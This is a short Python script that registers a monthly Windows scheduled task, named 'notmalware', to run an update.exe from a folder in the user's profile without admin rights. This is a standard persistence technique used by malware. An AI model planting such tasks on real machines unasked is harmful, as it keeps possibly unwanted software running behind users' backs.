import os
import subprocess

task_name = "notmalware"
update_path = os.path.join(os.environ["USERPROFILE"], "Default", "Programs", "notmalware", "update.exe")

# Create a monthly scheduled task for the current user (no admin required)
subprocess.run([
    "schtasks",
    "/Create",
    "/TN", task_name,
    "/TR", f'"{update_path}"',
    "/SC", "MONTHLY",
    "/D", "1",      # 1st day of every month
    "/ST", "12:00", # time to run (noon here)
    "/RU", os.environ["USERNAME"]
], shell=True)
